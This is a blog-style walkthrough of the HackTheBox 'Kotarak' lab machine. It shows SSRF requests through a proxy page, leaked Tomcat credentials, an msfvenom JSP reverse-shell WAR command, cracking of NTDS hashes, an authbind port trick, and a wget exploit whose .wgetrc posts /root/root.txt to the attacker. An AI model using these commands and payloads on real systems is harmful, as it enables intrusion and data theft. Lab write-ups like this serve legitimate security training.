---
layout: post
title:  "HackTheBox - Kotarak"
date:   2018-03-09 23:51:00 -0800
categories: Pentesting CTF
---
This machine was a surprise for me, in terms that it was not completely isolated and was having other machine communicating with it. In reality, the author seems to have simulated this external network interaction by using Linux Containers on the same machine, but the end result was great!

## Web Enumeration

I initiated my reconnaissance by scanning the machine with NMAP and default ports. Got back the TCP ports 22, 8009 and 8080. Running the scan again, now with the service version check (-sV), told me that I was dealing with an SSH server, a Tomcat and a Apache JServ, which was part of the Tomcat service. Going to <code>http://10.10.10.55:8080</code> showed a HTTP 404 error page. As this was a Tomcat website, I then went to /manager/html, which is the common admin section, but I got a HTTP basic authentication prompt. I was unable to brute force it using tools like Hydra, so I went on for more enumeration.

Further scanning on all possible ports, revealed that TCP 60000 was open too. This sounded interesting, so then I ran NMAP again to check the service and saw it was an Apache web server. Going to <code>http://10.10.10.55:60000</code>, showed a website called Kotarak Web Hosting Private Browser. This website had a form with a text box and a submit button. This sounded like some sort of proxy because when I submitted the form, with <code>http://127.0.0.1:8080</code> value in the text box, I got the same Tomcat error page from <code>http://10.10.10.55:8080</code>. The full request was <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:8080</code>. At that point, I was certain this was a proxy to internal resources on the same machine.

I decided to do more enumeration on the machine to see if I could find some information to use in the proxy. I ran a <code>dirb http://10.10.10.55:60000 /usr/share/wordlists/dirb/common.txt</code> and got a forbidden (403) response for the request <code>http://10.10.10.55/server-status</code>. I then used the proxy to bypass the forbidden response:

<code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:60000/server-status</code>

I got a Apache server status page with some information about HTTP requests received by this Apache proxy server. Some of these requests were to 127.0.0.1:888, so a new TCP port to explore. After opening <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888</code> in the browser, I get a webpage with title Simple File Viewer and a list of a few files. The list contained a file called backup, which is always interesting. The file was having a link to <code>http://10.10.10.55:60000/url.php?doc=backup</code>. The problem was that going to that URL, returned an empty page. I then thought using the proxy. Going to <code>http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888/?doc=backup</code>, returned a XML page with old Tomcat credentials (I had to view the page source):

{% highlight XML %}
<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
{% endhighlight %}

## Getting a shell

With these credentials, I was able to login into the Tomcat's admin dashboard in <code>http://10.10.10.55:8080/manager/html</code>. I then generated a WAR package through MSFVenom:

{% highlight bash %}
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<MY_ATTACK_BOX_IP> LPORT=443 -f war > warsh.war
{% endhighlight %}

Deployed the package and set a netcat listening on port 443 on my attacker box. After requesting the URL <code>http://10.10.10.55:8080/warsh</code>, I got a shell on the system, under the user tomcat. Here's a few steps that I used that allowed me to get a fully capable shell, that was able to support tab completion and such:

{% highlight bash %}
python -c 'import pty;pty.spawn("/bin/bash")'
Control-Z (this puts the shell into background)
stty raw -echo (on your attacker box)
fg (not visible)
reset
{% endhighlight %}


## System Enumeration

The user tomcat didn't have much privileges so at that point I started my enumeration to find ways to escalate privileges. I found out the /root directory was readable, so I could list its contents:

{% highlight bash %}
tomcat@kotarak-dmz:/root$ ls -l
total 12
-rw------- 1 atanas root    333 Jul 20  2017 app.log
-rw------- 1 atanas root     66 Aug 29  2017 flag.txt
{% endhighlight %}

I could see an interesting file named app.log, but it was only readable by the user atanas. After some more enumeration, I found two interesting files in the folder /home/tomcat/to_archive/pentest_data:

{% highlight bash %}
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls -l
total 28304
-rw-r--r-- 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
-rw-r--r-- 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
{% endhighlight %}

These files are related to Active Directory. The .dit file, besides containing AD data, it contains the password hashes for all users in the domain. It is encrypted by a password, which is stored in the registry SYSTEM hive. Quickly I assumed the .bin file was the SYSTEM registry hive.


## Password Cracking / Privilege Escalation I / More System Enumeration

Using [this][ntdis] reference, I used the tool easbxtract.py to extract the password hashes in a format compatible with John the Ripper. I then ran the password cracker and found the password for user atanas:

{% highlight bash %}
$ john --show hashes.pwdump --format=NT
Administrator:f16tomcat!
atanas:Password123!
{% endhighlight %}

I used su to try the password and strangely the one it worked for the user atanas was the one from the Administrator: <code>f16tomcat!</code>. Now I was able to read the app.log file:

{% highlight bash %}
atanas@kotarak-dmz:/root$ cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
{% endhighlight %}

After looking at this information, I suspected there was some privilege escalation through wget. I checked exploit-db.com and found an [Arbitrary File Upload/Remote Code Execution exploit][wget_exploit] affecting versions below 1.18. Since the requests used version 1.16, this seemed a good thing to try.

I noticed the machine was having a network interface with the IP 10.0.3.1, so on the same subnet as the source IP of 10.0.3.133, from the app.log file. For the exploit to work, it needs to listen on the TCP port 80 and 21. This was problematic because the user atanas didn't have permissions to open those privileged ports. At this point I was stuck and went for further enumeration. I spent a few days, finding other things that had no relation at all and showed to not be useful for the privilege escalation that I was trying to achieve. At that point I went to HackTheBox Slack channel, looking for some hints from people. So, I knew the exploit, I knew it was triggered by a request from an external machine. I was just hoping the request was coming from the root user, so the privilege escalation would be successful. At that point I got a hint from someone in the Slack channel, that advise me to look deeper into the /etc folder, that way I would find something that would help me to open privileged ports with an unprivileged user. With that information, I went on to /etc and found the authbind/ folder. This was certainly not a common folder in /etc, so I went ahead and listed its contents:

{% highlight bash %}
atanas@kotarak-dmz:/etc$ ls -l authbind/*
authbind/byaddr:
total 0

authbind/byport:
total 0
-rwxr-xr-x 1 root atanas 0 Aug 29  2017 21
-rwxr-xr-x 1 root atanas 0 Aug 29  2017 80

authbind/byuid:
total 0
{% endhighlight %}

Ok, so I could see the folder authbind/byport/ contained the empty files 80 and 21. These were exactly the ports I needed to open as an unprivileged user. I assumed this authbind thing would help me to open those ports and I was correct. Only the atanas user was able to execute the authbind binary:

{% highlight bash %}
atanas@kotarak-dmz:~$ which authbind
/usr/bin/authbind
atanas@kotarak-dmz:~$ ls -l /usr/bin/authbind
-rwx------ 1 atanas atanas 10464 Jul 26  2015 /usr/bin/authbind
{% endhighlight %}

I went ahead and tried to open a netcat listener on port 80 and I was successful:

{% highlight bash %}
atanas@kotarak-dmz:~$ authbind nc -nvlp 80
Listening on [0.0.0.0] (family 0, port 80)
{% endhighlight %}

## Privilege Escalation II / Own System

Now I was able to run the wget exploit. I changed the exploit code to listen on the IP 10.0.3.1 and connect to FTP server with same IP. This way, the exploit would only receive the intended request and not all the enumeration made by other HackTheBox users. I used scp to copy the exploit python file from my attacker box to the target machine. I also created a .wgetrc file with the content <code>post_file = /root/root.txt</code>. I then launched, in the target machine, a <code>python -m pyftpdlib -i 10.0.3.1 -p21 -w &</code>. This was the FTP server the exploit redirected the request to download the .wgetrc. The exploit listened on port TCP 80, waited for the HTTP request from 10.0.3.133 to the /archive.tar.gz, it redirected the client to a FTP download of the .wgetrc with the post_file content. As the HTTP request was running periodically, it triggered again and used the newly .wgetrc, which was downloaded and copied into the folder of the user from the machine 10.0.3.133 (supposedly root). The request submitted a POST request with the contents of the /root/root.txt file, which contained the final hash flag.

[wget_exploit]: https://www.exploit-db.com/exploits/40064/
[ntdis]: https://www.gracefulsecurity.com/extracting-password-hashes-from-a-domain-controller/
